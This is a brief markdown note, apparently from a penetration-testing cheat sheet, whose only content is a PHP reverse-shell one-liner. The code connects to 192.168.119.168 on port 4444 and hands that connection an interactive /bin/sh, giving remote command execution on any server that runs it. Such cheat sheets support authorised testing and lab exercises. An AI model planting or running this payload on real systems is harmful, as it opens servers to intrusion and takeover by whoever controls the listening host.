# revshell

### php revshell one-liner
```php
<?php $sock = fsockopen("192.168.119.168",4444); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
```
---
